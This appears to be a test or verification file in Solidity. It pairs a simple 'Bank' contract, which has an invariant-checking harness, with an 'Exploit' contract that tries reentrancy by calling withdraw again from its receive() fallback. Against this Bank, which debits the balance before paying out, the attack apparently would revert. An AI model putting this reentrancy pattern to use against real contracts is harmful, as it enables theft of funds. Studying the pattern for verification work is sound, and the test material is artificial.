//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
contract Bank {
    mapping (address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(amount > 0);
        require(amount <= balances[msg.sender]);

        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
    }
    function invariant(uint choice, uint u1, address a) public payable {
        uint currb = balances[a];
        if (choice == 0) {
            deposit();
        } else if (choice == 1) {
            withdraw(u1);
        } else {
            require(false);
        }
        uint newb = balances[a];

        require(newb < currb);
        assert(choice == 1);
        assert(msg.sender == a);
}
}


contract Exploit {
    Bank target;
    bool reentrantCall;

    constructor(address _target) {
        target = Bank(_target);
        reentrantCall = false;
    }

    function attack() public payable {
        require(msg.value > 0, "Must send some ether to initiate the attack");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (!reentrantCall) {
            reentrantCall = true;
            target.withdraw(msg.value);
        }
    }
}